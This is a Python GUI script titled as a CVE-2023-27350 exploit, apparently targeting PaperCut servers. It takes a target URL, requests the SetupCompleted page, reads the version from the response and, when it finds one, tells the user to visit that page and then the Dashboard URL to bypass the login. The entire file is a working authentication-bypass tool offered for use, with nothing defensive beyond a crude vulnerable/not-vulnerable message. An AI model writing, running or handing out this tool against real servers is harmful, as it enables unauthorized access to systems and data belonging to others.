import requests
from bs4 import BeautifulSoup
import re
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def vuln_version():
    root = tkinter.Tk()
    root.title("CVE-2023-27350 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        ip = inp
        url = ip+"/app?service=page/SetupCompleted"
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        text_div = soup.find('div', class_='text')
        product_span = text_div.find('span', class_='product')

    # Search for the first span element containing a version number
        version_span = None
        for span in text_div.find_all('span'):
            version_match = re.match(r'^\d+\.\d+\.\d+$', span.text.strip())
            if version_match:
                version_span = span
                break

        if version_span is None:
            #print('Not Vulnerable')
            scroll_y = Scrollbar(root, orient=VERTICAL)
            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
            scroll_y.pack(side=RIGHT, fill=Y)
            scroll_y.config(command=txtarea.yview)
            txtarea.insert(END, "Not Vulnerable")
            txtarea.pack(fill=BOTH, expand=True)
            txtarea.configure(state ='disabled')
        else:
            version_str = version_span.text.strip()
            scroll_y = Scrollbar(root, orient=VERTICAL)
            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
            scroll_y.pack(side=RIGHT, fill=Y)
            scroll_y.config(command=txtarea.yview)
            #print('Version:', version_str)
            #print("Vulnerable version")
           # print(f"Step 1 visit this url first in your browser: {url}")
           # print(f"Step 2 visit this url in your browser to bypass the login page : http://{ip}:9191/app?service=page/Dashboard")
            txtarea.insert(END, "Version:")
            txtarea.insert(END, version_str)
            txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
            txtarea.insert(END, f"Step 1 visit this url first in your browser: {url}")
            txtarea.insert(END, f"Step 2 visit this url in your browser to bypass the login page : http://{ip}/app?service=page/Dashboard")
            txtarea.pack(fill=BOTH, expand=True)
            txtarea.configure(state ='disabled')

    Hacher = Label(root, text="Enter domin http://www.example.com : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()

